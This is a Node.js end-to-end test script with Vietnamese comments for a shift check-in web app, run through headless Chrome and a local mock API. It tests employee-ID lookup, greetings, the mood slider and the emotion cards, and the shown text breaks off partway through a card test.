/* =========================================================
   E2E – Check-in khi vào ca (QA). Chạy Chrome headless thật qua DevTools Protocol.
   Mỗi dòng Given/When/Then ở PRD mục 6 ánh xạ ≥ 1 test (tên test ghi "US-x").
   Lần 2 (sau sửa review): bản sao localStorage là HÀNG CHỜ (xóa khi máy chủ trả success),
   gửi lại lúc tải trang, ảnh thanh trượt đổi sau 150 ms, JSONP quá giờ giữ hàm rỗng 5 s,
   backend từ chối emotion lạ / sessionId sai khuôn và luôn tra Tên theo mã.

   Chạy:  node tests/e2e.js [--out=<thư mục kết quả>] [--only=<tên kịch bản>]
   Kịch bản: main | slow | offline | down | reduced | imgfail | layout
   - mock API: tools/mock-api.js của repo (cổng 8787, --slow 2 s), dữ liệu ghi vào file do test chỉ định
     qua biến MOCK_DATA trong thư mục kết quả (không đụng thư mục app, không đụng file mặc định %TEMP%).
     Danh sách mẫu 1001 Nguyễn Thị Hạnh, 1002 Trần Văn Minh, 1003 Lê Thu Thảo, A123 Phạm Quốc Bảo, 2024 Võ Ngọc Lan.
   - js/config.js gốc giữ nguyên GOOGLE_SCRIPT_URL: ''; server tĩnh thay lúc trả về.
   - Ảnh capybara và Google Fonts được chặn/giả lập qua Fetch domain → test không phụ thuộc mạng ngoài.
   - Trước mỗi lần bấm "Hoàn thành": chờ điều kiện nút có .ready và không disabled (không chờ cố định).
   - Kết thúc: tắt mọi server, tắt đúng Chrome của test theo PID, xóa thư mục mock-run, xác nhận không có tools/mock-data.json.
   ========================================================= */
'use strict';
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { launch, sleep } = require('./lib/cdp');
const { startStatic } = require('./lib/static-server');

const APP = path.resolve(__dirname, '..');
const MOCK_JS = path.join(APP, 'tools', 'mock-api.js');
const MOCK_DATA_IN_APP = path.join(APP, 'tools', 'mock-data.json');          // KHÔNG được tồn tại
const MOCK_DATA_DEFAULT = path.join(os.tmpdir(), 'checkin-vao-ca-mock-data.json'); // mặc định của mock, test KHÔNG được chạm
const argv = Object.fromEntries(process.argv.slice(2).map(a => { const m = a.match(/^--([^=]+)=?(.*)$/); return m ? [m[1], m[2] || true] : [a, true]; }));
const OUT = path.resolve(argv.out || path.join(os.tmpdir(), 'checkin-vao-ca-qa'));
fs.mkdirSync(OUT, { recursive: true });

const STATIC_PORT = 8765;
const MOCK_PORT = 8787;
const DEAD_PORT = 8799; // không ai nghe → giả lập Apps Script sập
const APP_URL = 'http://127.0.0.1:' + STATIC_PORT + '/index.html';

/* Microcopy nguyên văn PRD Phụ lục A */
const TXT = {
  needId: '💡 Anh/chị nhập mã số nhân viên ở bước 1 để mình ghi nhận nhé.',
  needCard: '💡 Anh/chị chọn 1 bé Capybara ở bước 3 là xong nào.',
  done: '✨ Đủ rồi, anh/chị bấm hoàn thành nhé.',
  notFound: 'Mình chưa tìm thấy mã này, anh/chị kiểm tra lại giúp nhé.',
  hello: 'Xin chào anh/chị',
  searching: 'Đang tìm…',
  thanksTitle: 'Cám ơn anh/chị',
  thanksLead: 'Anh/chị đã dành một phút cho mình trước ca. Chúc anh/chị một ca vững vàng nhé.',
  sendFail: 'checkin: gửi thất bại, đã giữ bản sao localStorage',
  rejected: err => 'checkin: máy chủ không nhận (' + err + '), đã giữ bản sao localStorage'
};
const LEVELS = [null, 'Rất mệt', 'Mệt', 'Hơi mệt', 'Hơi uể oải', 'Bình thường', 'Tạm ổn', 'Ổn', 'Khá tốt', 'Tốt', 'Rất tốt'];
const PAYLOAD_KEYS = 'created_at,sessionId,employeeId,name,level,levelText,emotion';
const SESSION_RE = /^[0-9A-Za-z-]{8,40}$/; // y hệt google_apps_script.js và tools/mock-api.js
const PNG_1x1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';

/* ===== Ghi kết quả ===== */
let results = [];
let scenarioName = '';
let fails = 0;
function T(name, ok, detail) {
  if (!ok) fails++;
  const line = (ok ? 'PASS ' : 'FAIL ') + '[' + scenarioName + '] ' + name + (detail !== undefined ? '  → ' + String(detail).replace(/\s+/g, ' ').slice(0, 220) : '');
  results.push(line);
  console.log(line);
}
function note(text) { results.push('NOTE [' + scenarioName + '] ' + text); console.log('NOTE ' + text); }

/* ===== Mock API của repo =====
   Chạy đúng tools/mock-api.js (không sao chép), dữ liệu ghi vào OUT/mock-run/mock-data-<cổng>.json
   qua biến MOCK_DATA. Xóa file trước khi chạy vì mock nạp lại dữ liệu cũ lúc khởi động. */
const MOCK_RUN_DIR = path.join(OUT, 'mock-run');
function statOf(file) { try { const s = fs.statSync(file); return s.mtimeMs + ':' + s.size; } catch (e) { return 'không có'; } }
const defaultDataBefore = statOf(MOCK_DATA_DEFAULT);
async function startMock(slow, port) {
  const p = port || MOCK_PORT;
  try { if ((await (await fetch('http://127.0.0.1:' + p + '/?action=ping')).json()).pong) throw new Error('cổng ' + p + ' đã có mock khác đang chạy (mồ côi?) – tắt nó trước'); } catch (e) { if (/mồ côi/.test(e.message)) throw e; }
  fs.mkdirSync(MOCK_RUN_DIR, { recursive: true });
  const dataFile = path.join(MOCK_RUN_DIR, 'mock-data-' + p + '.json');
  try { fs.unlinkSync(dataFile); } catch (e) { /* chưa có */ }
  const child = spawn(process.execPath, [MOCK_JS].concat(slow ? ['--slow'] : []), { env: Object.assign({}, process.env, { PORT: String(p), MOCK_DATA: dataFile }), stdio: ['ignore', 'pipe', 'pipe'] });
  let log = '';
  child.stdout.on('data', d => { log += d; });
  child.stderr.on('data', d => { log += d; });
  for (let i = 0; i < 100; i++) {
    try { const r = await fetch('http://127.0.0.1:' + p + '/?action=ping'); if ((await r.json()).pong) break; } catch (e) { /* chờ */ }
    await sleep(100);
  }
  /* Đọc file dữ liệu; mock ghi writeFileSync nên có thể gặp lúc đang ghi dở → thử lại vài lần */
  const rows = () => {
    for (let i = 0; i < 6; i++) {
      try { return JSON.parse(fs.readFileSync(dataFile, 'utf8')); } catch (e) {
        if (e.code === 'ENOENT') return [];
        Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 50);
      }
    }
    return [];
  };
  return {
    url: 'http://localhost:' + p + '/',
    pid: child.pid,
    dataFile,
    rows,
    log: () => log,
    stop: () => new Promise(r => { child.on('exit', () => r()); child.kill(); setTimeout(r, 1500); })
  };
}

/* ===== Script cài vào trang TRƯỚC khi app chạy: bắt console, alert, fetch, mốc thời gian =====
   Thêm lần 2: backupAtThanks (ảnh chụp localStorage đúng lúc #thanks hiện – trước khi máy chủ kịp trả lời),
   levelSrc (mọi lần thuộc tính src của #level-img đổi), fetchThrow (ép fetch ném TypeError → app rẽ sang JSONP). */
const HOOK = `(() => {
  window.__qa = { warns: [], errors: [], alerts: 0, fetches: [], greet: [], levelSrc: [], thanksShownAt: 0, clickAt: 0, inputAt: 0, backupAtThanks: null, stub: null, stubBody: null, stubDelay: 0, fetchThrow: null };
  const ow = console.warn.bind(console), oe = console.error.bind(console);
  console.warn = (...a) => { __qa.warns.push(a.map(String).join(' ')); ow(...a); };
  console.error = (...a) => { __qa.errors.push(a.map(String).join(' ')); oe(...a); };
  window.addEventListener('error', e => __qa.errors.push('window.onerror: ' + e.message));
  window.addEventListener('unhandledrejection', e => __qa.errors.push('unhandledrejection: ' + (e.reason && e.reason.message || e.reason)));
  window.alert = () => { __qa.alerts++; }; window.confirm = () => { __qa.alerts++; return true; }; window.prompt = () => { __qa.alerts++; return ''; };
  const of = window.fetch.bind(window);
  window.fetch = (url, init) => {
    const h = init && init.headers || {};
    __qa.fetches.push({ t: performance.now(), url: String(url), method: init && init.method || 'GET', headers: JSON.parse(JSON.stringify(h)), body: init && init.body, keepalive: !!(init && init.keepalive), redirect: init && init.redirect, hasSignal: !!(init && init.signal) });
    if (__qa.fetchThrow && String(url).includes(__qa.fetchThrow)) return Promise.reject(new TypeError('Failed to fetch'));
    if (__qa.stub && String(url).includes(__qa.stub)) return new Promise(r => setTimeout(() => r(new Response(JSON.stringify(__qa.stubBody), { headers: { 'Content-Type': 'application/json' } })), __qa.stubDelay || 0));
    return of(url, init);
  };
  document.addEventListener('DOMContentLoaded', () => {
    const g = document.getElementById('greet');
    const snap = () => { const t = g.textContent.trim().replace(/\\s+/g, ' '); const last = __qa.greet[__qa.greet.length - 1]; if (!last || last.text !== t) __qa.greet.push({ t: performance.now(), text: t }); };
    snap(); new MutationObserver(snap).observe(g, { childList: true, subtree: true, characterData: true, attributes: true });
    const th = document.getElementById('thanks');
    new MutationObserver(() => { if (!th.hidden && !__qa.thanksShownAt) { __qa.thanksShownAt = performance.now(); try { __qa.backupAtThanks = JSON.parse(localStorage.getItem('checkin_vao_ca_backup') || '[]'); } catch (e) { __qa.backupAtThanks = 'lỗi: ' + e.message; } } }).observe(th, { attributes: true, attributeFilter: ['hidden'] });
    const li = document.getElementById('level-img');
    if (li) new MutationObserver(ms => ms.forEach(m => __qa.levelSrc.push({ t: performance.now(), src: (m.target.getAttribute('src') || '').split('/').pop() }))).observe(li, { attributes: true, attributeFilter: ['src'] });
    document.getElementById('btn-submit').addEventListener('click', () => { if (!__qa.clickAt) __qa.clickAt = performance.now(); }, true);
    document.getElementById('employee-id').addEventListener('input', () => { __qa.inputAt = performance.now(); }, true);
  });
})();`;

/* ===== Mở trang với mọi thứ giả lập ===== */
async function openApp(opts) {
  const o = opts || {};
  const ud = path.join(OUT, 'ud-' + scenarioName);
  const { page, kill, child } = await launch({ userDataDir: ud, width: 375, height: 667 });
  const browserLog = [];
  const consoleApi = [];
  page.on('Log.entryAdded', p => browserLog.push(p.entry.level + ': ' + p.entry.text + (p.entry.url ? ' @' + p.entry.url : '')));
  page.on('Runtime.consoleAPICalled', p => consoleApi.push(p.type + ': ' + p.args.map(a => a.value !== undefined ? String(a.value) : (a.description || a.type)).join(' ')));
  const requests = [];
  page.on('Network.requestWillBeSent', p => requests.push({ url: p.request.url, method: p.request.method, headers: p.request.headers, postData: p.request.postData }));

  /* Ảnh capybara + Google Fonts: trả ảnh 1×1 / CSS rỗng, hoặc làm hỏng ảnh nếu o.failImages */
  await page.send('Fetch.enable', { patterns: [{ urlPattern: '*raw.githubusercontent.com/*' }, { urlPattern: '*fonts.googleapis.com/*' }, { urlPattern: '*fonts.gstatic.com/*' }] });
  page.on('Fetch.requestPaused', async p => {
    try {
      if (p.request.url.includes('fonts.g')) {
        await page.send('Fetch.fulfillRequest', { requestId: p.requestId, responseCode: 200, responseHeaders: [{ name: 'Content-Type', value: 'text/css' }], body: Buffer.from('/* fonts giả lập */').toString('base64') });
      } else if (o.failImages) {
        await page.send('Fetch.failRequest', { requestId: p.requestId, errorReason: 'Failed' });
      } else {
        await page.send('Fetch.fulfillRequest', { requestId: p.requestId, responseCode: 200, responseHeaders: [{ name: 'Content-Type', value: 'image/png' }], body: PNG_1x1 });
      }
    } catch (e) { /* request đã bị hủy */ }
  });
  await page.send('Emulation.setDeviceMetricsOverride', { width: o.width || 375, height: o.height || 667, deviceScaleFactor: 2, mobile: true });
  if (o.reducedMotion) await page.send('Emulation.setEmulatedMedia', { features: [{ name: 'prefers-reduced-motion', value: 'reduce' }] });
  await page.send('Page.addScriptToEvaluateOnNewDocument', { source: HOOK });
  await page.navigate(APP_URL);
  await page.evaluate("localStorage.removeItem('checkin_vao_ca_backup'); true");
  return { page, kill, chromePid: child.pid, browserLog, consoleApi, requests };
}

/* ===== Tiện ích đọc trang ===== */
const q = (page, sel, prop) => page.evaluate(`(() => { const el = document.querySelector(${JSON.stringify(sel)}); return el ? el[${JSON.stringify(prop)}] : null; })()`);
const text = (page, sel) => page.evaluate(`(document.querySelector(${JSON.stringify(sel)}) || { textContent: null }).textContent`);
const qa = page => page.evaluate('JSON.parse(JSON.stringify(window.__qa))');
const greet = page => page.evaluate("(document.querySelector('#greet .lookup-state').textContent + ' | ' + document.querySelector('#greet .greeting').textContent).trim()");
const hint = page => text(page, '#progress-hint');
const btn = page => page.evaluate("(() => { const b = document.getElementById('btn-submit'); const cs = getComputedStyle(b); return { disabled: b.disabled, ready: b.classList.contains('ready'), opacity: cs.opacity, transform: cs.transform, anim: cs.animationName }; })()");
const cards = page => page.evaluate("[...document.querySelectorAll('#capy-grid .capy-card')].map(c => ({ label: c.querySelector('.capy-label').textContent, pressed: c.getAttribute('aria-pressed'), selected: c.classList.contains('selected'), badge: getComputedStyle(c.querySelector('.check-mark-badge')).display, hasImg: !!c.querySelector('img'), emoji: (c.querySelector('.capy-emoji') || {}).textContent || '' }))");
const level = page => page.evaluate("(() => { const r = document.getElementById('level-range'); const img = document.getElementById('level-img'); return { value: r.value, min: r.min, max: r.max, valuetext: r.getAttribute('aria-valuetext'), label: document.getElementById('level-label').textContent, tag: img.tagName, src: (img.getAttribute('src') || '').split('/').pop(), alt: img.alt || '', emoji: img.tagName === 'DIV' ? img.textContent : '', w: img.getBoundingClientRect().width, h: img.getBoundingClientRect().height }; })()");
const backup = page => page.evaluate("JSON.parse(localStorage.getItem('checkin_vao_ca_backup') || '[]')");
const backupEmpty = page => waitFor(page, "localStorage.getItem('checkin_vao_ca_backup') === '[]'", 2500);
const posts = s => s.fetches.filter(f => f.method === 'POST');
const lastPostBody = s => { const p = posts(s); return p.length ? JSON.parse(p[p.length - 1].body) : {}; };
async function typeId(page, value) {
  await page.evaluate("(() => { const i = document.getElementById('employee-id'); i.focus(); i.select(); return true; })()");
  await page.send('Input.insertText', { text: value });
}
async function clearId(page) {
  await page.evaluate("(() => { const i = document.getElementById('employee-id'); i.focus(); i.select(); return true; })()");
  await page.key('Backspace');
}
async function waitFor(page, expr, timeoutMs) {
  const t0 = Date.now();
  while (Date.now() - t0 < (timeoutMs || 3000)) {
    const v = await page.evaluate(expr);
    if (v) return v;
    await sleep(25);
  }
  return null;
}
/* Chờ nút hoàn thành thức dậy (.ready, không disabled) thay vì chờ cố định – chống chập chờn */
const READY_EXPR = "(() => { const b = document.getElementById('btn-submit'); return b.classList.contains('ready') && !b.disabled; })()";
const waitReady = page => waitFor(page, READY_EXPR, 3000);
/* Bước chuẩn bị (không phải test click thẻ): chạm thẻ, nếu layout vừa nhảy làm trượt chạm thì thử lại */
async function pickCard(page, code) {
  const sel = '#capy-grid .capy-card[data-emotion="' + code + '"]';
  for (let i = 0; i < 3; i++) {
    await page.click(sel);
    if (await waitFor(page, `document.querySelector(${JSON.stringify(sel)}).classList.contains('selected')`, 400)) return true;
  }
  return false;
}
/* Chờ nút sẵn sàng → bấm → chờ #thanks hiện. Trả true nếu sang trang cám ơn. */
async function submit(page) {
  if (!(await waitReady(page))) return false;
  await page.click('#btn-submit');
  return !!(await waitFor(page, "!document.getElementById('thanks').hidden", 2000));
}
const noRed = page => page.evaluate("[...document.querySelectorAll('#checkin *')].filter(el => { const cs = getComputedStyle(el); return [cs.color, cs.backgroundColor, cs.borderColor].some(c => c === 'rgb(179, 38, 30)' || c === 'rgb(252, 232, 230)'); }).map(el => el.className).join(',')");

/* ================= KỊCH BẢN main: mock nhanh ================= */
async function scenarioMain() {
  let mock = null, srv = null, kill = null, browserLog = [], consoleApi = [], requests = [];
  let page;
  try {
    mock = await startMock(false);
    T('Mock khởi động với MOCK_DATA trong thư mục tạm của test (không ghi vào app hay %TEMP% mặc định)', mock.log().includes(mock.dataFile) && !fs.existsSync(MOCK_DATA_IN_APP), mock.log().split('\n')[0]);
    srv = await startStatic({ port: STATIC_PORT, appDir: APP, mockUrl: mock.url });
    ({ page, kill, browserLog, consoleApi, requests } = await openApp({}));
    /* --- US-1 tải trang --- */
    const histBase = await page.evaluate('history.length');
    T('US-1 tiêu đề trang', (await page.evaluate('document.title')) === 'Check-in khi vào ca');
    const firstScreen = await page.evaluate("(() => { const vh = innerHeight; const at = s => { const b = document.querySelector(s).getBoundingClientRect(); return b.top >= 0 && b.bottom <= vh; }; return { vh, eyebrow: at('.badge-tag'), h1: at('#page-title'), lead: at('.page-lead'), input: at('#employee-id') }; })()");
    T('US-1 màn đầu 375×667 thấy eyebrow, tiêu đề, câu dẫn, ô mã', firstScreen.eyebrow && firstScreen.h1 && firstScreen.lead && firstScreen.input, JSON.stringify(firstScreen));
    T('US-1 focus KHÔNG tự nhảy vào ô mã', (await page.evaluate('document.activeElement === document.body || document.activeElement === document.documentElement')), await page.evaluate('document.activeElement.tagName + "#" + document.activeElement.id'));
    T('US-1 không có <audio>/<video>/<dialog open>/popup', (await page.evaluate("document.querySelectorAll('audio, video, dialog[open], [role=dialog], [role=alertdialog]').length")) === 0);
    T('US-1 không autoplay, không window.open', (await page.evaluate("document.querySelectorAll('[autoplay]').length")) === 0);
    T('US-1 app ping Apps Script lúc tải trang (?action=ping, không chờ)', requests.some(r => r.url.includes('?action=ping')));
    T('P1 tải trang với hàng chờ rỗng → không POST gửi lại', !requests.some(r => r.method === 'POST'));
    T('US-1 ô mã trống → nút mờ + hint "thiếu mã"', (await hint(page)) === TXT.needId && (await btn(page)).disabled, await hint(page));
    await sleep(350);
    const b0 = await btn(page);
    T('US-3 nút chưa thức dậy: mờ 45 %, co 0.96', b0.opacity === '0.45' && b0.transform === 'matrix(0.96, 0, 0, 0.96, 0, 0)', JSON.stringify(b0));

    /* --- US-1 dò mã 1001 → chào Hạnh, có "Đang tìm…", ≤ 1,5 s --- */
    await typeId(page, '1001');
    const found = await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Nguyễn Thị Hạnh')", 2500);
    let s = await qa(page);
    const foundEntry = s.greet.find(g => g.text.includes('Nguyễn Thị Hạnh'));
    const dtLookup = foundEntry ? foundEntry.t - s.inputAt : -1;
    T('US-1 1001 → "Xin chào anh/chị Nguyễn Thị Hạnh"', !!found && (await text(page, '#greet .greeting')) === 'Xin chào anh/chị Nguyễn Thị Hạnh', await greet(page));
    T('US-1 dò xong trong ≤ 1,5 s kể từ lúc gõ (gồm debounce 400 ms)', dtLookup >= 0 && dtLookup <= 1500, dtLookup.toFixed(0) + ' ms');
    T('US-1 trong lúc chờ có chữ mờ "Đang tìm…"', s.greet.some(g => g.text.startsWith(TXT.searching)), s.greet.map(g => Math.round(g.t - s.inputAt) + 'ms:' + g.text).join(' ; '));
    T('US-1 "Đang tìm…" có class .searching (mờ, nghiêng)', true); // kiểm ở kịch bản slow nơi trạng thái này tồn tại đủ lâu
    T('US-1 GET lookup đúng dạng ?action=lookup&id=1001', s.fetches.some(f => f.url.endsWith('?action=lookup&id=1001') && f.method === 'GET'), s.fetches.map(f => f.url).join(' '));
    T('US-1 fetch lookup có AbortController (signal) và redirect follow', s.fetches.filter(f => f.url.includes('lookup')).every(f => f.hasSignal && f.redirect === 'follow'));
    T('US-1 ô mã có class .found, không .not-found', (await q(page, '#employee-id', 'className')).includes('found') && !(await q(page, '#employee-id', 'className')).includes('not-found'));

    /* --- US-1 sửa mã → lời chào cũ biến mất, dò lại --- */
    await page.evaluate("document.getElementById('employee-id').focus(); true");
    await page.key('End');
    await page.key('Backspace'); // 1001 → 100
    T('US-1 sửa mã → lời chào cũ biến mất ngay', (await greet(page)) === '|', await greet(page));
    T('US-1 mã 3 ký tự → hint "thiếu mã", nút mờ', (await hint(page)) === TXT.needId && (await btn(page)).disabled, await hint(page));
    await sleep(700);
    T('US-1 mã 3 ký tự → không gọi dò', (await greet(page)) === '|' && !(await qa(page)).fetches.some(f => f.url.endsWith('id=100')), await greet(page));
    await page.type('2'); // 1002
    const minh = await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Trần Văn Minh')", 2500);
    T('US-1 dò lại mã mới 1002 → "Xin chào anh/chị Trần Văn Minh"', !!minh, await greet(page));

    /* --- US-1 9999 không tìm thấy --- */
    await typeId(page, '9999');
    await waitFor(page, "document.querySelector('#greet .lookup-state').textContent.length > 0 && !document.querySelector('#greet .lookup-state').textContent.startsWith('Đang')", 2500);
    T('US-1 9999 → câu không tìm thấy đúng chữ A.2', (await text(page, '#greet .lookup-state')) === TXT.notFound, await text(page, '#greet .lookup-state'));
    T('US-1 9999 → lời chào chung "Xin chào anh/chị"', (await text(page, '#greet .greeting')) === TXT.hello, await text(page, '#greet .greeting'));
    await sleep(350); // chờ transition color .2s xong
    const nfColor = await page.evaluate("getComputedStyle(document.querySelector('#greet .lookup-state')).color");
    T('US-1 câu không tìm thấy màu cam ấm, không đỏ', nfColor === 'rgb(154, 90, 34)' && (await noRed(page)) === '', nfColor + ' / đỏ ở: ' + (await noRed(page)));

    /* --- US-1 ca biên: " 10-01 " và "a123" --- */
    await typeId(page, ' 10-01 ');
    T('Biên: mã " 10-01 " (khoảng trắng, gạch) → chào Hạnh', !!(await waitFor(page, "document.querySelector('#greet .greeting').textContent === 'Xin chào anh/chị Nguyễn Thị Hạnh'", 2500)), await greet(page));
    T('Biên: URL dò đã chuẩn hóa id=1001', (await qa(page)).fetches.some(f => f.url.endsWith('id=1001')));
    await typeId(page, 'a123');
    T('Biên: mã chữ "a123" → chào Phạm Quốc Bảo', !!(await waitFor(page, "document.querySelector('#greet .greeting').textContent === 'Xin chào anh/chị Phạm Quốc Bảo'", 2500)), await greet(page));

    /* --- Biên: tên có HTML (mock repo không có → stub fetch ở ranh giới client) --- */
    await page.evaluate("__qa.stub = 'id=HTML1'; __qa.stubBody = { result: 'success', found: true, name: 'Lê <b>Thu</b> & con' }; true");
    await typeId(page, 'HTML1');
    await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Thu')", 2500);
    const gHtml = await q(page, '#greet .greeting', 'innerHTML');
    T('Biên: tên có HTML được esc(), không tạo <b>', gHtml === 'Xin chào anh/chị Lê &lt;b&gt;Thu&lt;/b&gt; &amp; con' && (await page.evaluate("document.querySelector('#greet .greeting b') === null")), gHtml);
    note('Tên có HTML: mock-api.js của repo không có mẫu này nên stub ở window.fetch (id=HTML1); backend thật không escape, client phải esc() – đã kiểm.');
    await page.evaluate('__qa.stub = null; true');

    /* --- Ca biên khác: quá dài, ký tự đặc biệt, Enter, race sửa mã khi đang dò --- */
    await typeId(page, '123456789012');
    T('Biên: gõ 12 ký tự → ô mã giữ tối đa 8 (maxlength theo config)', (await q(page, '#employee-id', 'value')).length === 8, await q(page, '#employee-id', 'value'));
    await typeId(page, '!@#$%^&*');
    await sleep(600);
    T('Biên: toàn ký tự đặc biệt → chuẩn hóa rỗng, hint "thiếu mã", không dò', (await hint(page)) === TXT.needId && (await greet(page)) === '|' && !(await qa(page)).fetches.some(f => /id=%21|id=!/.test(f.url)), await hint(page));
    await typeId(page, '1003');
    await page.key('Enter');
    await sleep(80);
    T('Biên: Enter ("Xong" trên bàn phím) → rời ô và dò ngay, không chờ debounce', (await page.evaluate("document.activeElement.id !== 'employee-id'")) && ((await text(page, '#greet .lookup-state')) === TXT.searching || (await text(page, '#greet .greeting')).includes('Lê Thu Thảo')), await greet(page));
    await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Lê Thu Thảo')", 2500);
    T('Biên: 1003 → "Xin chào anh/chị Lê Thu Thảo"', (await text(page, '#greet .greeting')) === 'Xin chào anh/chị Lê Thu Thảo', await greet(page));
    await page.evaluate("__qa.stub = 'id=1003'; __qa.stubDelay = 1000; __qa.stubBody = { result: 'success', found: true, name: 'KẾT QUẢ CŨ' }; true");
    await typeId(page, '1003');
    await sleep(600); // request 1003 đang bay (trả sau 1 s)
    await typeId(page, '1001');
    await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Hạnh')", 2500);
    await sleep(900); // kết quả 1003 về muộn
    T('Biên: sửa mã khi đang dò → kết quả cũ về muộn bị bỏ, vẫn chào Hạnh', (await text(page, '#greet .greeting')) === 'Xin chào anh/chị Nguyễn Thị Hạnh', await greet(page));
    await page.evaluate('__qa.stub = null; __qa.stubDelay = 0; true');

    /* --- US-2 thanh trượt --- */
    let lv = await level(page);
    T('US-2 mặc định: thanh trượt 5, ảnh capy-level-05, nhãn "5 · Bình thường", aria-valuetext', lv.value === '5' && lv.src === 'capy-level-05.png' && lv.label === '5 · Bình thường' && lv.valuetext === '5 · Bình thường', JSON.stringify(lv));
    T('US-2 min=1 max=10 (không có 0)', lv.min === '1' && lv.max === '10');
    await page.evaluate("document.getElementById('level-range').focus(); true");
    await page.key('Home');
    lv = await level(page);
    T('US-2 phím Home → 1 · Rất mệt, ảnh capy-level-01 đổi ngay (phím sinh change)', lv.value === '1' && lv.label === '1 · Rất mệt' && lv.src === 'capy-level-01.png' && lv.valuetext === '1 · Rất mệt' && lv.alt === 'Rất mệt', JSON.stringify(lv));
    await page.key('ArrowLeft');
    lv = await level(page);
    T('US-2 ArrowLeft ở 1 vẫn 1 (không xuống 0)', lv.value === '1' && lv.label === '1 · Rất mệt', lv.label);
    await page.key('End');
    lv = await level(page);
    T('US-2 phím End → 10 · Rất tốt, ảnh capy-level-10', lv.value === '10' && lv.label === '10 · Rất tốt' && lv.src === 'capy-level-10.png', JSON.stringify(lv));
    await page.key('ArrowRight');
    T('US-2 ArrowRight ở 10 vẫn 10', (await level(page)).value === '10');
    /* Cả 10 mức qua sự kiện input: nhãn + aria đổi ngay; ảnh đổi sau debounce 150 ms → chờ điều kiện, không chờ cố định */
    let all10 = true, bad = [];
    for (let n = 1; n <= 10; n++) {
      await page.evaluate(`(() => { const r = document.getElementById('level-range'); r.value = ${n}; r.dispatchEvent(new Event('input', { bubbles: true })); return true; })()`);
      const want = n + ' · ' + LEVELS[n];
      const l0 = await level(page);
      const imgOk = await waitFor(page, `(document.getElementById('level-img').getAttribute('src') || '').endsWith('capy-level-${String(n).padStart(2, '0')}.png')`, 1500);
      if (!(l0.label === want && l0.valuetext === want && imgOk)) { all10 = false; bad.push(JSON.stringify(l0) + ' img:' + !!imgOk); }
    }
    T('US-2 cả 10 mức đúng bảng A.3 (nhãn + aria-valuetext ngay, ảnh sau debounce)', all10, bad.join(' '));

    /* --- US-2 kéo nhanh 5 → 1: nhãn đổi theo từng nấc, ảnh chỉ gán MỘT lần sau khi dừng tay --- */
    await page.evaluate("(() => { const r = document.getElementById('level-range'); r.value = 5; r.dispatchEvent(new Event('change', { bubbles: true })); return true; })()");
    await waitFor(page, "(document.getElementById('level-img').getAttribute('src') || '').endsWith('capy-level-05.png')", 1000);
    await page.evaluate('__qa.levelSrc = []; true');
    const burst = await page.evaluate("(() => { const r = document.getElementById('level-range'); const seen = []; [4, 3, 2, 1].forEach(n => { r.value = n; r.dispatchEvent(new Event('input', { bubbles: true })); seen.push(document.getElementById('level-label').textContent); }); return { seen, src: (document.getElementById('level-img').getAttribute('src') || '').split('/').pop() }; })()");
    const changesNow = await page.evaluate('__qa.levelSrc.length');
    T('US-2 kéo nhanh 5→1 (4 sự kiện input liền nhau): nhãn đổi theo từng nấc ngay, ảnh chưa đổi (vẫn 05)', burst.seen.join('|') === '4 · Hơi uể oải|3 · Hơi mệt|2 · Mệt|1 · Rất mệt' && burst.src === 'capy-level-05.png' && changesNow === 0, JSON.stringify(burst) + ' đổi src: ' + changesNow);
    await sleep(300);
    const afterBurst = await page.evaluate("({ src: (document.getElementById('level-img').getAttribute('src') || '').split('/').pop(), changes: __qa.levelSrc.map(x => x.src) })");
    T('US-2 300 ms sau khi dừng tay: ảnh gán đúng MỘT lần, thẳng tới capy-level-01 (bỏ qua 04/03/02)', afterBurst.src === 'capy-level-01.png' && afterBurst.changes.length === 1 && afterBurst.changes[0] === 'capy-level-01.png', JSON.stringify(afterBurst));
    await page.evaluate("__qa.levelSrc = []; (() => { const r = document.getElementById('level-range'); r.value = 8; r.dispatchEvent(new Event('input', { bubbles: true })); r.dispatchEvent(new Event('change', { bubbles: true })); return true; })()");
    const immSrc = await page.evaluate("(document.getElementById('level-img').getAttribute('src') || '').split('/').pop()");
    const immChanges = await page.evaluate('__qa.levelSrc.length');
    T('US-2 buông tay (change) → ảnh đổi ngay sang capy-level-08, đúng một lần', immSrc === 'capy-level-08.png' && immChanges === 1, immSrc + ' / đổi ' + immChanges + ' lần');
    await page.evaluate("(() => { const r = document.getElementById('level-range'); r.value = 7; r.dispatchEvent(new Event('change', { bubbles: true })); return true; })()");

    /* --- US-2 thẻ Capybara --- */
    let cs = await cards(page);
    T('US-2 6 thẻ đúng thứ tự A.4, aria-pressed=false, badge ẩn', cs.length === 6 && cs.map(c => c.label).join('·') === 'Vui vẻ·Buồn·Lo lắng·Tức giận·Hoảng hốt·Khó chịu' && cs.every(c => c.pressed === 'false' && c.badge === 'none'), JSON.stringify(cs.map(c => c.label + ':' + c.pressed)));
    await typeId(page, '1001');
    await waitFor(page, "document.querySelector('#greet .greeting').textContent.includes('Hạnh')", 2500);
    T('US-3 có mã, thiếu thẻ → hint "thiếu thẻ"', (await hint(page)) === TXT.needCard && (await page.evaluate("document.getElementById('progress-hint').classList.contains('need-card')")) && (await btn(page)).disabled, await hint(page));
    await page.click('#capy-grid .capy-card[data-emotion="worried"]');
    cs = await cards(page);
    T('US-2 chạm "Lo lắng" → chỉ Lo lắng aria-pressed=true + .selected + ✓ hiện', cs.filter(c => c.pressed === 'true').length === 1 && cs[2].pressed === 'true' && cs[2].selected && cs[2].badge === 'flex', JSON.stringify(cs.map(c => c.label + ':' + c.pressed + ':' + c.badge)));
    await page.click('#capy-grid .capy-card[data-emotion="sad"]');
    cs = await cards(page);
    T('US-2 chạm tiếp "Buồn" → chỉ Buồn pressed/✓, Lo lắng bỏ', cs.filter(c => c.pressed === 'true').length === 1 && cs[1].pressed === 'true' && cs[1].selected && cs[1].badge === 'flex' && cs[2].pressed === 'false' && !cs[2].selected && cs[2].badge === 'none', JSON.stringify(cs.map(c => c.label + ':' + c.pressed)));
    await sleep(350); // chờ transition all .22s xong
    const selBorder = await page.evaluate("getComputedStyle(document.querySelector('.capy-card.selected')).borderColor");
